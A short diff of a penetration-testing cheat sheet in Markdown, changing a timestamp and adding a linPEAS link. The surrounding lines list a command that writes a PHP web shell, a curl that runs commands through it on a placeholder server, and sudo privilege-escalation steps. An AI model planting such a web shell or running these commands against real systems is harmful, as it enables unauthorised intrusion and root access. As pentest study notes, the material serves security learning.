@@ -2,7 +2,7 @@
 id: 3o48nuz7byeshb4lhbfpang
 title: PEN_cheatsheet
 desc: ''
-updated: 1678080779184
+updated: 1680243688437
 created: 1673077678854
 ---
 ## Basic Tools
@@ -79,7 +79,7 @@ created: 1673077678854
 | `echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php` | Create a webshell php file |
 | `curl http://SERVER_IP:PORT/shell.php?cmd=id` | Execute a command on an uploaded webshell |
 | **Privilege Escalation** |
-| `./linpeas.sh` | Run `linpeas` script to enumerate remote server |
+| `./linpeas.sh` | Run [linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) script to enumerate remote server |
 | `sudo -l` | List available `sudo` privileges |
 | `sudo -u user /bin/echo Hello World!` | Run a command with `sudo` |
 | `sudo su -` | Switch to root user (if we have access to `sudo su`) |
